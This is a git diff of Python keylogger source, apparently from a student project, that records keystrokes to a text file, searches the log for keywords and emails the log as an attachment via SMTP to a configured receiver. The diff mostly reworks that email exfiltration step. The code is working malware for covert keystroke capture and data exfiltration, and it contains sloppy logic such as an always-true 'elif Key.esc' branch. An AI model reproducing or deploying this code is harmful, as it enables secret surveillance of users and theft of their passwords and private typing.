@@ -4,21 +4,20 @@ from datetime import datetime
 import pyperclip
 import string
 import atexit
-
-import signal
-
 import os
+from dotenv import load_dotenv
 
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
+from email.mime.application import MIMEApplication
+from os.path import basename
 import smtplib
-
 
 def cleanup_function():
     # Perform cleanup actions or trigger desired function
+
     search()
+    # send_email()
 
 def stamp(fp, prev, init=False, gap=10):
     now = datetime.now()
@@ -68,6 +67,8 @@ def keyPressed(key):
                  pass
             elif "Key.shift" in str(key):
                  pass
+            elif Key.esc:
+                 pass
 
             # elif str(key) == "Key.backspace":
             #         if logKey.tell() > 0:
@@ -75,16 +76,7 @@ def keyPressed(key):
             #             logKey.truncate()
             else:
                  logKey.write(f"<{str(key)}>")
-    # string to search in file
-    # words = ['laptop', 'phone']
-    # with open(r"C:\Users\USER\PycharmProjects\fyp\keyfile.txt", 'r') as logKey:
-    #     content = logKey.read()
-    # # Iterate list to find each word
-    # for word in words:
-    #     if word in content:
-    #         print('string exist in a file')
-    #     else:
-    #         break
+
 def on_release(key):
     if key == Key.esc:
         print("Escape key pressed. Stopping listener...")
@@ -92,42 +84,45 @@ def on_release(key):
 
 def send_email():
     # Getting the email from the environ file
+    load_dotenv()
+
     email_sender = os.environ.get("EMAIL_SENDER")
     email_password = os.environ.get("EMAIL_PASSWORD")
     email_receiver = os.environ.get("EMAIL_RECEIVER")
     smtp_server = os.environ.get("SMTP_SERVER")
     port = int(os.environ.get("PORT"))
 
-    # Subject and body of the email
+
+    # Subject and contet of the email
     subject = "Keylog"
-    body = """
+    content = """
     Testing Keylogger txt file
     """
 
 
-    email = MIMEMultipart()
-    email["From"] = email_sender
-    email["To"] = email_receiver
-    email["Subject"] = subject
-
-    email.attach(MIMEText(body, "plain"))
+    msg = MIMEMultipart()
+    msg["From"] = email_sender
+    msg["To"] = email_receiver
+    msg["Subject"] = subject
+    body = MIMEText(content, 'plain')
+    msg.attach(body)
 
     # Define the file to attach
     file = f"{filename}.txt"
 
     # Encode as base 64
-    with open("keyfile.txt", 'a') as f:
-        attachment_package = MIMEBase('application', 'octet-stream')
-        attachment_package.set_payload(f.read())
-        encoders.encode_base64(attachment_package)
-        attachment_package.add_header('Content-Disposition', "attachment; filename= " + file)
-        email.attach(attachment_package)
+    with open(file, 'r') as f:
+        part = MIMEApplication(f.read(), Name=basename(file))
+        part['Content-Disposition'] = 'attachment; filename="{}"'.format(basename(file))
+    msg.attach(part)
 
-    with smtplib.SMTP_SSL(smtp_server, port) as smtp:
+    # context = ssl.create_default_context()
+
+    with smtplib.SMTP(smtp_server, port) as smtp:
         smtp.starttls()
         smtp.login(email_sender, email_password)
-        smtp.sendmail(email_sender, email_receiver, email.as_string())
-
+        smtp.send_message(msg, email_sender, email_receiver)
+        print("mail sent")
 def search():
     words = ['laptop', 'phone']
     with open(rf"C:\Users\USER\PycharmProjects\fyp\{filename}.txt", 'r') as logKey:
